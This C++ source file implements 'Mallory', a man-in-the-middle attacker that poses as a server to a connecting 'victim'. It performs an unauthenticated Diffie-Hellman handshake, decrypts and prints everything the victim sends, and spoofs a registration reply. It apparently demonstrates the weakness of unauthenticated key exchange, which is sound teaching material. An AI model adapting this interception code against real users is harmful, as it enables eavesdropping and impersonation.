#include <iostream>
#include <string>
#include <cstring>
#include <vector>
#include <cstdint>
#include <mutex>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <openssl/bn.h>
#include "dh.h"
#include "crypto.h"

std::string trim(const std::string& s) {
    size_t start = 0, end = s.size();
    while (start < end && std::isspace(static_cast<unsigned char>(s[start]))) start++;
    while (end > start && std::isspace(static_cast<unsigned char>(s[end - 1]))) end--;
    return s.substr(start, end - start);
}

std::vector<std::string> parse_frame(const std::string& raw) {
    std::vector<std::string> parts;
    size_t first = raw.find('|');
    if (first == std::string::npos) {
        parts.push_back(trim(raw));
        return parts;
    }
    parts.push_back(trim(raw.substr(0, first)));

    size_t second = raw.find('|', first + 1);
    if (second == std::string::npos) {
        parts.push_back(trim(raw.substr(first + 1)));
    } else {
        parts.push_back(raw.substr(first + 1, second - first - 1));
        parts.push_back(raw.substr(second + 1));
    }
    return parts;
}

static const size_t MAX_MSG_SIZE = 1 << 20;

ssize_t recv_exact(int fd, void* buf, size_t n) {
    size_t got = 0;
    char* p = static_cast<char*>(buf);
    while (got < n) {
        ssize_t r = recv(fd, p + got, n - got, 0);
        if (r <= 0) return r;
        got += static_cast<size_t>(r);
    }
    return static_cast<ssize_t>(got);
}

bool send_exact(int fd, const void* buf, size_t n) {
    size_t sent = 0;
    const char* p = static_cast<const char*>(buf);
    while (sent < n) {
        ssize_t s = send(fd, p + sent, n - sent, MSG_NOSIGNAL);
        if (s <= 0) return false;
        sent += static_cast<size_t>(s);
    }
    return true;
}

bool send_framed(int fd, const std::string& payload) {
    uint32_t len = htonl(static_cast<uint32_t>(payload.size()));
    if (!send_exact(fd, &len, sizeof(len))) return false;
    return send_exact(fd, payload.data(), payload.size());
}

bool recv_framed(int fd, std::string& out) {
    uint32_t len_net;
    if (recv_exact(fd, &len_net, sizeof(len_net)) <= 0) return false;
    uint32_t len = ntohl(len_net);
    if (len > MAX_MSG_SIZE) return false;
    out.resize(len);
    if (len == 0) return true;
    return recv_exact(fd, out.data(), len) > 0;
}

bool perform_dh_as_server(int victim_fd, BIGNUM* p, BIGNUM* g, BN_CTX* ctx, BIGNUM*& shared_secret_out) {
    std::string frame;
    if (!recv_framed(victim_fd, frame)) return false;

    auto parts = parse_frame(frame);
    if (parts.empty() || parts[0] != "DH_INIT" || parts.size() < 2) return false;

    BIGNUM* victim_pub = nullptr;
    if (!BN_hex2bn(&victim_pub, parts[1].c_str())) return false;

    DHKeyPair my_kp = dh_generate_keypair(p, g, ctx);
    shared_secret_out = dh_compute_shared_secret(victim_pub, my_kp.priv, p, ctx);

    bool ok = send_framed(victim_fd, "DH_RESP|" + dh_bn_to_hex(my_kp.pub));

    BN_free(victim_pub);
    dh_free_keypair(my_kp);
    return ok;
}

int main(int argc, char** argv) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <listen_port>\n";
        return 1;
    }
    int listen_port = std::atoi(argv[1]);

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listen_port);
    bind(listen_fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
    listen(listen_fd, 8);

    std::cout << "[MALLORY] Listening for victim on port " << listen_port << " ...\n";

    sockaddr_in victim_addr{};
    socklen_t victim_len = sizeof(victim_addr);
    int victim_fd = accept(listen_fd, reinterpret_cast<sockaddr*>(&victim_addr), &victim_len);
    std::cout << "[MALLORY] Victim connected.\n";

    BN_CTX* ctx = BN_CTX_new();
    BIGNUM* p = dh_load_prime();
    BIGNUM* g = dh_load_generator();

    BIGNUM* victim_shared_secret = nullptr;
    if (!perform_dh_as_server(victim_fd, p, g, ctx, victim_shared_secret)) {
        std::cerr << "[MALLORY] DH handshake with victim failed.\n";
        return 1;
    }

    std::cout << "[MALLORY] DH complete with victim. Fingerprint: "
              << dh_sha256_fingerprint(victim_shared_secret) << "\n";

    unsigned char victim_key[32];
    dh_derive_aes_key(victim_shared_secret, victim_key);

    std::cout << "[MALLORY] Now decrypting everything the victim sends:\n\n";

    std::string blob;
    bool registered = false;
    while (recv_framed(victim_fd, blob)) {
        std::string plaintext;
        if (aes_gcm_decrypt(victim_key, blob, plaintext)) {
            std::cout << "[MALLORY DECRYPTED] " << plaintext << "\n";

            if (!registered) {
                auto reg_parts = parse_frame(plaintext);
                if (!reg_parts.empty() && reg_parts[0] == "REGISTER" && reg_parts.size() >= 2) {
                    std::string spoofed_ok;
                    aes_gcm_encrypt(victim_key, "REGISTER_OK|" + reg_parts[1], spoofed_ok);
                    send_framed(victim_fd, spoofed_ok);
                    registered = true;
                    std::cout << "[MALLORY] Spoofed REGISTER_OK back to victim (posing as the real server).\n";
                }
            }
        } else {
            std::cout << "[MALLORY] Received a frame it could not decrypt.\n";
        }
    }

    std::cout << "[MALLORY] Victim disconnected.\n";
    close(victim_fd);
    return 0;
}